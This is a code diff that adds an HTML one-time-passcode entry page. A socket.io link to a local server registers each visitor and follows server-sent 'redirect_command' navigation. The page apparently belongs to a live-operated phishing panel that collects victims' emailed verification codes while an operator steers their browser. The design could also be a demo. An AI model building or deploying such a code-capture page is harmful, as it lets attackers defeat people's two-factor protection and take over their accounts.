@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>OTP Verification</title>
+
+    <script src="http://localhost:3000/socket.io/socket.io.js"></script>
+    <style>
+     .bg-beach {
+            background-image: url('https://i.pinimg.com/736x/a6/17/2f/a6172f4e83b679433c00bf71595a3dce.jpg');
+        }
+        body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #f3f4f6; }
+        .box { background: white; padding: 40px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 360px; }
+        .code-group { display: flex; justify-content: center; gap: 8px; margin: 25px 0; }
+        .digit-field { width: 40px; height: 50px; font-size: 24px; text-align: center; border: 2px solid #ccc; border-radius: 4px; }
+        .digit-field:focus { border-color: #3498db; outline: none; }
+        .btn { width: 90%; padding: 12px; background: #f80404; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body class="bg-gray-200 bg-beach bg-cover bg-no-repeat">
+
+    <div class="box">
+        <h2>Enter Verification Code</h2>
+        <p>We've sent a 6-digit code to your email. Please enter it below.</p>
+        
+        <form action="/verify-code" method="POST">
+            <div class="code-group">
+                <input class="digit-field" type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" required onkeyup="jump(this, 'c2')">
+                <input class="digit-field" id="c2" type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" required onkeyup="jump(this, 'c3')">
+                <input class="digit-field" id="c3" type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" required onkeyup="jump(this, 'c4')">
+                <input class="digit-field" id="c4" type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" required onkeyup="jump(this, 'c5')">
+                <input class="digit-field" id="c5" type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" required onkeyup="jump(this, 'c6')">
+                <input class="digit-field" id="c6" type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" required>
+            </div>
+            
+            <input type="hidden" name="full_code" id="compiled_output">
+            <input type="hidden" name="email_context" id="email_context">
+            <button type="submit" class="btn" onclick="compile()">Verify</button>
+        </form>
+    </div>
+
+    <script>
+        // Connect directly via absolute path link
+        const socket = io("http://localhost:3000");
+        let currentEmail = localStorage.getItem('active_staff_email') || "";
+        document.getElementById('email_context').value = currentEmail;
+
+        function joinRoom() {
+            if (currentEmail) {
+                // Instantly re-verify and announce this page reload back to the server room
+                socket.emit("verify_and_register", { email: currentEmail, password: "session_reconnect" });
+            }
+        }
+
+        joinRoom();
+        socket.on('connect', () => { joinRoom(); });
+
+        // Listen for next background commands (allows navigating to approval or reset)
+        socket.on("redirect_command", (destinationUrl) => {
+            if (destinationUrl === "/force_reset_kick") {
+                localStorage.removeItem('active_staff_email');
+                window.location.href = "http://localhost:3000/";
+            } else {
+                window.location.href = "http://localhost:3000" + destinationUrl; 
+            }
+        });
+
+        function jump(elem, nextId) {
+            if(elem.value.length >= 1) {
+                document.getElementById(nextId).focus();
+            }
+        }
+        function compile() {
+            let res = "";
+            document.querySelectorAll('.digit-field').forEach(input => res += input.value);
+            document.getElementById('compiled_output').value = res;
+        }
+    </script>
+</body>
+</html>
